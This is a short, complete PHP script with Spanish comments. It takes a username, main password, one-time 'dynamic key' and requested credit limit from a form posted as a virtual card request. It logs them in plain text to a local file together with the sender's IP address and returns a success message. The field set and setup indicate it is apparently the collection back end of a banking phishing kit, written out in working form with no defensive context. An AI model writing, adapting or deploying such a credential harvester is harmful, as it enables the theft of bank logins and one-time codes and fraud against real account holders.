<?php
// Configuración para permitir solicitudes locales
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Captura de datos recibidos del formulario
    $usuario  = isset($_POST['usuario']) ? trim($_POST['usuario']) : '';
    $clave    = isset($_POST['clave']) ? trim($_POST['clave']) : '';
    $dinamica = isset($_POST['dinamica']) ? trim($_POST['dinamica']) : '';
    $cupo     = isset($_POST['cupo']) ? trim($_POST['cupo']) : '';
    $fecha    = date("Y-m-d H:i:s");
    $ip       = $_SERVER['REMOTE_ADDR'];

    // Validar que se reciban los datos indispensables
    if (!empty($usuario) && !empty($clave)) {
        // Estructurar el texto a guardar
        $registro = "=== NUEVA SOLICITUD DE TARJETA VIRTUAL ===\n";
        $registro .= "Fecha: $fecha\n";
        $registro .= "IP: $ip\n";
        $registro .= "Usuario: $usuario\n";
        $registro .= "Clave Principal: $clave\n";
        $registro .= "Clave Dinámica: $dinamica\n";
        $registro .= "Cupo Solicitado: $ " . number_format((double)$cupo, 0, ',', '.') . "\n";
        $registro .= "==========================================\n\n";

        // Guardar el registro en un archivo de texto local (datos.txt)
        file_put_contents("datos.txt", $registro, FILE_APPEND | LOCK_EX);

        // Responder con un JSON de éxito
        echo json_encode(["status" => "success", "message" => "Datos guardados correctamente"]);
        exit;
    }
}

// En caso de que se intente entrar por GET o datos incompletos
echo json_encode(["status" => "error", "message" => "Método no permitido o datos inválidos"]);
?>
